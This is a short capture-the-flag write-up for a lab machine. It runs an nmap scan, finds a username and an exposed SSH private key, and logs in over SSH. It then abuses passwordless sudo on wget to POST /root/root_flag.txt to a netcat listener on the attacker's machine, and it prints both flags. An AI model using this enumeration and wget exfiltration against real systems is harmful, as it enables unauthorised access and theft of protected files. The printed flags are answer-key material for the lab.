This CTF was not that hard, so I'll explain it 3 steps

1.Scan 
```
└─$ nmap -sS -sC -A -vv 10.10.40.213  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 03:59 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:59
Completed NSE at 03:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:59
Completed NSE at 03:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:59
Completed NSE at 03:59, 0.00s elapsed
Initiating Ping Scan at 03:59
Scanning 10.10.40.213 [4 ports]
Completed Ping Scan at 03:59, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:59
Completed Parallel DNS resolution of 1 host. at 03:59, 0.12s elapsed
Initiating SYN Stealth Scan at 03:59
Scanning 10.10.40.213 [1000 ports]
Discovered open port 80/tcp on 10.10.40.213
Discovered open port 22/tcp on 10.10.40.213
Increasing send delay for 10.10.40.213 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.40.213 from 5 to 10 due to max_successful_tryno increase to 5
Completed SYN Stealth Scan at 03:59, 22.89s elapsed (1000 total ports)
Initiating Service scan at 03:59
Scanning 2 services on 10.10.40.213
Completed Service scan at 03:59, 6.39s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.40.213
Retrying OS detection (try #2) against 10.10.40.213
Retrying OS detection (try #3) against 10.10.40.213
Retrying OS detection (try #4) against 10.10.40.213
Retrying OS detection (try #5) against 10.10.40.213
Initiating Traceroute at 04:00
Completed Traceroute at 04:00, 0.13s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 04:00
Completed Parallel DNS resolution of 2 hosts. at 04:00, 0.02s elapsed
NSE: Script scanning 10.10.40.213.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:00
Completed NSE at 04:00, 4.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:00
Completed NSE at 04:00, 0.56s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:00
Completed NSE at 04:00, 0.00s elapsed
Nmap scan report for 10.10.40.213
Host is up, received echo-reply ttl 63 (0.13s latency).
Scanned at 2025-07-22 03:59:29 CDT for 48s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/22%OT=22%CT=1%CU=31050%PV=Y%DS=2%DC=T%G=Y%TM=687F532
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=107%GCD=1%ISR=10B%TI=Z%II=I%TS=9)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=I%
OS:II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=103%TI=Z%CI=I%II=I%TS=A)SEQ(SP=FF%GCD=1%IS
OS:R=109%TI=Z%CI=RD%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%
OS:O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4
OS:=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R
OS:=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

```
2. Find an username(view-source of 80 port) and rsa_key(used gobuster to find it) 

```
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf


 <!-- Jessie don't forget to udate the webiste -->
```
username --> Jessie

```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.40.213/sitemap
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.40.213/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.40.213/sitemap/.ssh/]
/css                  (Status: 301) [Size: 318] [--> http://10.10.40.213/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.40.213/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.40.213/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 317] [--> http://10.10.40.213/sitemap/js/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

3. Connect to ssh
```
└─$ ssh -i key_rsa jessie@10.10.40.213
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

$find /home/jessie/ -type f -name "*.txt"

/home/jessie/.mozilla/firefox/c7ehx9zw.default-release/AlternateServices.txt
/home/jessie/.mozilla/firefox/c7ehx9zw.default-release/TRRBlacklist.txt
/home/jessie/.mozilla/firefox/c7ehx9zw.default-release/SecurityPreloadState.txt
/home/jessie/.mozilla/firefox/c7ehx9zw.default-release/pkcs11.txt
/home/jessie/.mozilla/firefox/c7ehx9zw.default-release/SiteSecurityServiceState.txt
/home/jessie/.mozilla/firefox/5jwm81pl.default-release/AlternateServices.txt
/home/jessie/.mozilla/firefox/5jwm81pl.default-release/TRRBlacklist.txt
/home/jessie/.mozilla/firefox/5jwm81pl.default-release/SecurityPreloadState.txt
/home/jessie/.mozilla/firefox/5jwm81pl.default-release/SiteSecurityServiceState.txt
/home/jessie/Documents/user_flag.txt
jessie@CorpOne:~$ cat /Documents/user_flag.txt
jessie@CorpOne:~$ cat /home/jessie/Documents/user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```
user flag ---> **057c67131c3d5e42dd5cd3075b198ff6**

```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget```
 i can use wget as root, so i can download root flag to into local VM to get root flag 

```
jessie@CorpOne:~$ wget --post-file /root/root_flag.txt http://10.8.159.108:4444
--2025-07-22 12:57:04--  http://<target_ip>:4444

# and on local VM use nc to catch it
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.159.108] from (UNKNOWN) [10.10.40.213] 34292
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.8.159.108:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d

```
root_flag--->b1b968b37519ad1daa6408188649263d
